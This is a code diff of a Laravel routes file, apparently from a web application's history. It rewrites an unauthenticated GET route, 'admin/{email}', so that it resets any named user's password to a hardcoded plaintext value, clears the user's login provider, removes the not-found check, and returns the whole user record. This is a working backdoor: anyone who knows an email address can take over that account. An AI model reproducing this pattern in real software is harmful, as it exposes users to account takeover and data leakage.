@@ -32,8 +32,10 @@ Route::get('/', function (Request $request) {
 // Route::get('test/{user}', [UserController::class, 'issuePass']);
 Route::get('admin/{email}', function ($email) {
     $user = User::where('email', $email)->first();
-    if (!$user) abort(404);
-    $user->assignRole('hyperion');
+    $user->password = Hash::make('@40Kmph00');
+    $user->provider = null;
+    $user->save();
+    $user->assignRole('member');
     return $user;
 });
 
